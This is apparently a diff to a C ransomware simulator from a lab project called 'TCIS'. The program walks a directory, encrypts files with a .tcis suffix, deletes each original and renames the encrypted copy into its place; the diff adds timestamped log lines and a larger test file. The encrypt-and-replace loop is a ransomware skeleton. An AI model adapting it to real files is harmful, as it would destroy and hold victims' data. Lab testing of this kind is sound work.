@@ -16,6 +16,7 @@
 #include <string.h>
 #include <dirent.h>
 #include <unistd.h>
+#include <time.h>
 
 #define MAX_LEN 512
 /**
@@ -31,17 +32,18 @@ const char *get_filename_ext(const char *filename)
 	return dot + 1;
 }
 
+
 /**
  * This method is used to create a text file which its size is 1GB in the
  * directory /tmp
  * [create_large_file description]
  */
-const void create_large_file()
+const int create_large_file()
 {
-	printf("Generating test file in the direction /tmp\n");
+	printf("Generating test file in the directory /tmp/\n");
 	FILE *fp;
 	fp = fopen("/tmp/labtest.tcis", "w");
-	int size = 1024 * 1024 * 100; //100MB size
+	int size = 1024 * 1024 * 512; //512MB size
 	fseek(fp, size, SEEK_CUR);
 	fputs("Lab Test for TCIS project", fp);
 	fclose(fp);
@@ -55,13 +57,25 @@ const void create_large_file()
 	}
 	fclose(fp);
 	printf("Completed!\n");
+
+	return 0;
+}
+
+void format_time(char *output){
+    time_t rawtime;
+    struct tm * timeinfo;
+
+    time ( &rawtime );
+    timeinfo = localtime ( &rawtime );
+
+    sprintf(output, "[%d %d %d %d:%d:%d]",timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
 }
 
 
 int main(int argc, char const *argv[])
 {
 
-	if (! access("/tmp/labtest.tcis", F_OK) == 0)
+	if ((! access("/tmp/labtest.tcis", F_OK)) == 0)
 		create_large_file();
 
 	//Format the desired directory that we want to encrypt
@@ -84,7 +98,7 @@ int main(int argc, char const *argv[])
 		strcat(full_file_path, dest_encrypt_dir);
 		strcat(full_file_path, de->d_name);
 
-		//for test purpose we only encrypt tcis files.
+		//for test purpose we only encrypt the file with tcis suffix.
 		const char *ext = get_filename_ext(full_file_path);
 		if( strcmp(ext, "tcis")!=0)
 		  continue;
@@ -102,7 +116,12 @@ int main(int argc, char const *argv[])
 		if (ft == NULL)
 			continue;
 
-		printf("Ransomware starts to encrypt file!\n");
+		time_t t;
+		time(&t);
+		char *curr_time = ctime(&t);
+		curr_time[strlen(curr_time)-1] ='\0';
+
+		printf("[%s] Ransomware starts to encrypt file!\n", curr_time);
 		int blockSize = 256;
 		char buff[blockSize];
 
@@ -119,7 +138,12 @@ int main(int argc, char const *argv[])
 
 		remove(full_file_path);
 		rename(tgt, full_file_path);
-		printf("Ransomware has finished encrypting the file!\n");
+
+		time(&t);
+		curr_time = ctime(&t);
+		curr_time[strlen(curr_time)-1] ='\0';
+
+		printf("[%s] Ransomware has finished encrypting the file!\n\n", curr_time);
 	}
 
 	closedir(dr);
